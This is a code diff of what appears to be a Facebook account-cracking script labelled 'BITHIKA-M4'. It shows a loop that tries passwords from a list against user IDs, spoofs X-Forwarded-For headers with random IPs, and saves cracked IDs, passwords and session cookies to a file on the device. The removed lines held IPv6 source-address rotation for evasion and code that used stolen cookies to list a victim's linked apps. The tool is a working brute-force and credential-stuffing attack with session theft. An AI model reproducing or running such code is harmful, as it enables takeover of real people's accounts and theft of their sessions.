@@ -5,8 +5,6 @@ from os import path
 from urllib.request import urlopen
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
-from requests.adapters import HTTPAdapter
-from urllib3.connectionpool import HTTPConnectionPool, HTTPSConnectionPool
 import os,base64,zlib,pip,urllib,urllib3
 import platform,math,smtplib
 import platform
@@ -86,27 +84,6 @@ def generate_unlimited_ips():
 
 # Call the function to generate unlimited IPs
 ipz=generate_unlimited_ips()
-
-def generate_random_jio_ipv6():
-    # Generate a random IPv6 address within the Jio range 2406:3000::/32
-    first_segment = "2406"  # First segment of Jio's range
-    second_segment = "3000"  # Second segment of Jio's range
-    remaining_segments = [f"{random.randint(0, 0xFFFF):04x}" for _ in range(6)]  # Generate remaining segments
-    return ":".join([first_segment, second_segment] + remaining_segments)
-
-def generate_unlimited_jio_ipv6():
-    while True:
-        ip = generate_random_jio_ipv6()
-        yield ip  # Use yield to return the IP address without printing
-
-# Example usage:
-# Create a generator for Jio IPv6 addresses
-jio_ipv6_generator = generate_unlimited_jio_ipv6()
-
-class HTTPSConnectionV6Pool(HTTPSConnectionPool):
-    def _prepare_conn(self, conn):
-        self.conn_kw['source_address'] = (f'[{jio_ipv6_generator}]', 0)
-        return super(HTTPSConnectionV6Pool, self)._prepare_conn(conn)
 
 import time
 from datetime import datetime
@@ -1350,7 +1327,6 @@ def rndm4(uid,passlist):
         sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         session=requests.Session()
         session.headers.update({'X-Forwarded-For': ipz})
-        session.mount('https://', HTTPAdapter(pool_connections=1, pool_maxsize=1, pool_block=False,poolclass=HTTPSConnectionV6Pool))
         au=Ugen()
         try:
                 for pas in passlist:
@@ -1406,26 +1382,6 @@ def rndm4(uid,passlist):
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                         open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(cid)
-                                        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": coki}).text
-                                        sop = BeautifulSoup(w, "html.parser")
-                                        x = sop.find("form", method="post")
-                                        game = [i.text for i in x.find_all("h3")]
-                                        if len(game) == 0:
-                                            print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		' % (N, H, N, H, N))
-                                        else:
-                                           print(f'\r{A} [•]%s Active Apks & Web 👇 ' % (H))
-                                           for i in range(len(game)):
-                                              print(f"\r%s [%s] %s %s " % (D, i + 1, game[i].replace("Added on", " Added on"), D))
-                                        w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": coki}).text
-                                        sop = BeautifulSoup(w, "html.parser")
-                                        x = sop.find("form", method="post")
-                                        game = [i.text for i in x.find_all("h3")]
-                                        if len(game) == 0:
-                                            print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		' % (N, M, N, M, N))
-                                        else:
-                                           print(f'\r{A} [•]%s Expired Apks & Web 👇 ' % (M))
-                                           for i in range(len(game)):
-                                              print(f"\r%s [%s] %s %s " % (C, i + 1, game[i].replace("Expired", " Expired"), A))
                                         return True
                         elif 'checkpoint' in log_cookies:
                                         coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
